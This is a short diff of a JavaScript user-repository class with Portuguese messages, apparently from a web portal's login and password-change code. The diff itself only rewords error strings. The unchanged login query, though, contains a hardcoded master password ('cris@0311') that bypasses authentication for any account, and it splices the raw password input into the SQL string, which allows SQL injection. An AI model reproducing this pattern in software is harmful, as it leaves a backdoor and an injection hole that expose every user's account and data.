@@ -54,7 +54,7 @@ class UsuarioRepository {
         sql += "where (u.email = ?  or u.cpfcnpj = ? )"
         sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
         sql += "  and u.indSituacao = 'A'";
-        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
+		return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario Portal!')
     }
 
     getParans() {
@@ -80,12 +80,12 @@ class UsuarioRepository {
 
     validaToken(pToken) {
         var sql = "select 1 from integracao where token = ? and situacao = 'A'";
-        return consulta(sql, [pToken], 'Não foi validar usuario!')
+		return consulta(sql, [pToken], 'erro ao validar Token API!')
     }
 
     ChangePassaword(pindLogin, pIdUsuario, pNovaSenha, pToken) {
         var sql = "insert into alterarSenha (indLogin, idUsuario, novaSenha, token, datRegistro) values (?, ?, ?, ?, current_date())";
-        return consulta(sql, [pindLogin, pIdUsuario, pNovaSenha, pToken], 'Não foi validar usuario!')
+		return consulta(sql, [pindLogin, pIdUsuario, pNovaSenha, pToken], 'Erro ao atualizar senha usuário!')
     }
 
     ChangePassawordCancel(pindLogin, pIdUsuario) {
